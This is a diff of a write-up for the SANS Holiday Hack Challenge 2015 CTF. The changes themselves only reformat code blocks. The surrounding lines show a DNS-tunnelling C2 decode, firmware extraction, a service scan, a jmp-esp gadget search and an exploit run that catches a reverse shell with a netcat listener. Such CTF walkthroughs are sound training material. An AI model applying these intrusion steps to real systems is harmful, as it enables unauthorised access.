@@ -22,6 +22,8 @@ and possible illegal behaviour.
 It all begins when Joshua gives us a capture file of the network
 communications he recorded from the gnome...
 
+.. contents:: Table of contents
+
 Part 1: Dance of the Sugar Gnome Fairies: *Curious Wireless Packets*
 --------------------------------------------------------------------
 
@@ -40,14 +42,14 @@ is a well known trick to bypass traffic filtering, because outbound DNS is
 often authorized on a local network. So, let's extract and decode the TXT
 fields. tshark is particularly adapted for this task:
 
-.. code-block:: shell
+.. code-block:: console
 
    $ tshark -r giyh-capture.pcap -Y dns -T fields -e dns.txt | base64 -d > giyh-capture_decoded.txt
 
 Here, we ask tshark to focus on the DNS traffic, and to output only the TXT
 fields. Now, let's take a look at the decoded file:
 
-.. code-block:: shell
+.. code-block:: console
 
     $ cat giyh-capture_decoded.txt
     NONE:NONE:NONE:NONE:NONE:NONE:NONE:EXEC:iwconfig
@@ -107,7 +109,7 @@ configuration of the different wirelass network interfaces of the gnome, and
 
 We can recover the content of the uploaded file, with the following commands:
 
-.. code-block:: shell
+.. code-block:: console
 
     $ binwalk giyh-capture_decoded.txt # binwalk gives us the offset at which the JPEG file starts
 
@@ -139,7 +141,7 @@ We recover the `firmware </docs/sans-christmas-challenge-2015/giyh-firmware-dump
 :code:`bee93a79bb8ee2eba526494b4e6e56a601e1fa9589a1cccf7bfe61261ab8db20`) from
 Jessica. Now, time to analyze it! The best tool I know for file analysis is binwalk:
 
-.. code-block:: shell
+.. code-block:: console
 
     $ binwalk giyh-firmware-dump.bin 
 
@@ -152,7 +154,7 @@ Jessica. Now, time to analyze it! The best tool I know for file analysis is binw
 Using the :code:`-e` option form binwalk, we can extract the different files,
 and unsquash the file system, to get a browsable version of the file system:
 
-.. code-block:: shell
+.. code-block:: console
 
     $ binwalk -e giyh-firmware-dump.bin 
 
@@ -183,7 +185,7 @@ We can see that the firmware is based on OpenWRT, more specifically the
 Designated Driver branch, which is the development branch. We can find
 the architecture by looking at some binary files in the :code:`bin` folder:
 
-.. code-block:: shell
+.. code-block:: console
 
     $ file bin/ash 
     bin/ash: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-musl-armhf.so.1, stripped
@@ -193,7 +195,7 @@ The architecture of the gnome seems to be 32-bit ARM.
 We can see a :code:`www` folder at the root of the file system. Let's take a
 look at it:
 
-.. code-block:: shell
+.. code-block:: console
 
     $ ls
     app.js  bin  files  node_modules  package.json  public  routes  views
@@ -203,7 +205,7 @@ look at it:
 The embedded web site seems to be a NodeJS website, using the Jade Node
 Template Engine.
 
-.. code-block:: shell
+.. code-block:: console
 
     $ head app.js 
     var express = require('express');
@@ -221,7 +223,7 @@ We can see that the web site uses MongoDB as the database management system. We
 can find the MongoDB files in the squashfs-root/opt/mongodb directory. Let's
 copy them to a local install of MongoDB so that we can analyze them:
 
-.. code-block:: shell
+.. code-block:: console
 
     $ sudo cp squashfs-root/opt/mongodb/gnome.* /var/lib/mongodb
     $ sudo chown mongodb:nogroup /var/lib/mongodb/gnome.*
@@ -678,7 +680,7 @@ web interface, but in a network service run by the SuperGnome. If we
 take a look at the result of a :code:`nmap` command, we can see that
 we can connect to the SuperGnome on the port 4242:
 
-.. code-block:: shell
+.. code-block:: console
 
     $ nmap 54.233.105.81     
 
@@ -695,7 +697,7 @@ we can connect to the SuperGnome on the port 4242:
 
 Let's connect to it using :code:`netcat`:
 
-.. code-block:: shell
+.. code-block:: console
 
     $ nc 54.233.105.81 4242
 
@@ -710,7 +712,7 @@ Ok, this seems to be a service to get some informations about
 the SuperGnomes. Let's see if we have a copy of the binary
 in our copy of the firmware
 
-.. code-block:: shell
+.. code-block:: console
 
    $ grep -Rn "Welcome to the SuperGnome Server Status Center" .
 
@@ -819,7 +821,7 @@ Let's take a look at the binary, to see what kind of security it as. i'm
 using the :code:`checksec.sh` (available
 `here <https://github.com/slimm609/checksec.sh>`__) script to do so:
 
-.. code-block:: shell
+.. code-block:: console
 
     $ /checksec --file sgstatd
     RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH  FORTIFY FORTIFIED FORTIFY-able  FILE
@@ -842,7 +844,7 @@ the flow of execution on the stack. The opcode for such an instruction is
 :code:`ff e4`. If this value is familiar, it's because it's used in the custom
 stack canary (clever organizers)!
 
-.. code-block:: shell
+.. code-block:: console
 
     $ objdump -M intel -d sgstatd | grep "ff e4"
      8049366:   c7 45 fc e4 ff ff e4    mov    DWORD PTR [ebp-0x4],0xe4ffffe4
@@ -907,13 +909,13 @@ Let's see the exploit code:
 
 We launch our exploit:
 
-.. code-block:: shell
+.. code-block:: console
 
     $ ./exploit_sg05.py
 
 And in another terminal, on the server I own:
 
-.. code-block:: shell
+.. code-block:: console
 
    $ nc -lvp 8080
    listening on [any] 8080 ...
@@ -1284,7 +1286,7 @@ to recover the image from the boss' office:
 
 Then, we just have to run this script:
 
-.. code-block:: shell
+.. code-block:: console
 
     $ ./unxor_images.py sg01/factory_cam_1.png sg02/factory_cam_2.png sg03/factory_cam_3.png \
         sg04/factory_cam_4.png sg05/factory_cam_5.png camera_feed_overlap_error.png
